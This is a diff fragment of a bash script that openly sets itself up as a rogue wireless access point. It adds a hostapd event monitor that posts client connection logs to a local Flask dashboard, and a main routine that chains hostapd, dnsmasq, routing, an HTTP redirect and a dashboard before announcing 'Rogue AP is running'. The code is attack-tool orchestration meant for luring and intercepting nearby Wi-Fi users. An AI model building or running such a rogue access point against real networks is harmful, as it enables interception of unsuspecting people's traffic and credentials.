@@ -212,4 +212,37 @@ while true; do
     fi
 done
 
+# Function to monitor hostapd logs and send them to Flask
+monitor_hostapd() {
+    # Clear any existing monitor
+    pkill -f "hostapd_cli -i wlan0 -a"
+    
+    # Start hostapd_cli in monitor mode
+    hostapd_cli -i wlan0 -a /bin/bash -c '
+        curl -X POST -H "Content-Type: text/plain" --data-binary "$0" https://localhost/api/log -k
+    ' &
+    
+    echo "[*] Started hostapd monitor"
+}
+
+# Main script
+main() {
+    check_root
+    check_dependencies
+    setup_network_manager
+    configure_interface
+    start_hostapd
+    monitor_hostapd
+    start_dnsmasq
+    configure_routing
+    start_http_redirect
+    start_dashboard
+    
+    echo "[*] Rogue AP is running"
+    echo "[*] Press Ctrl+C to stop..."
+    wait
+}
+
+main
+
 
